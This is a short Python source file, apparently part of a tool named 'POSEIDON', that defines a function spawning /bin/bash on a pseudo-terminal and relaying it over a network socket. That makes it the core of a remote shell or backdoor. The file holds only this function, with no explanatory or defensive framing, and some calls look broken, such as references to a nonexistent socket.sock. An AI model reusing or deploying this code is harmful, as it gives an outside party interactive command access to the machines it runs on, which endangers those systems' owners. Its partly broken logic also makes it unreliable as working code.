# ======================================
# POSEIDON PROGRAM FILE
# APPLICATION:
# Author:Alvin Ye .ICBC
# Version(Internal):1.0
# All rights reserved
# ======================================

import pty
import tty
import select
import os
import time
import signal
import socket


def hup_handle(signum, frame):
    socket.sock.send("\n")
    socket.sock.close()
    raise SystemExit


def remote_bash(conn, addr):
    m, s = pty.openpty()
    print(os.ttyname(s))
    CHILD = 0
    pid = os.fork()
    if pid == CHILD:
        os.setsid()
        os.close(m)
        os.dup2(s, 0)
        os.dup2(s, 1)
        os.dup2(s, 2)

        tmp_fd = os.open(os.ttyname(s), os.O_RDWR)
        os.close(tmp_fd)
        os.execlp("/bin/bash", "/bin/bash")
        os.close(s)
    else:
        os.close(s)
        signal.signal(signal.SIGINT, hup_handle)
        fds = [m, conn]

        mode = tty.tcgetattr(0)
        # tty.setraw(0)
        try:
            while True:
                if not conn.connect_ex(addr): raise Exception
                r, w, e = select.select(fds, [], [])

                if m in r:
                    data = os.read(m, 1024)
                    if data:
                        conn.send(data)
                    else:
                        fds.remove(m)
                if conn in r:
                    data = conn.recv(1024)
                    if not data:
                        fds.remove(conn)
                        conn.close()
                        socket.sock.close()
                    if data:
                        os.write(m, data)
        except:
            conn.close()
            socket.sock.close()
            raise SystemExit
        os.close(m)

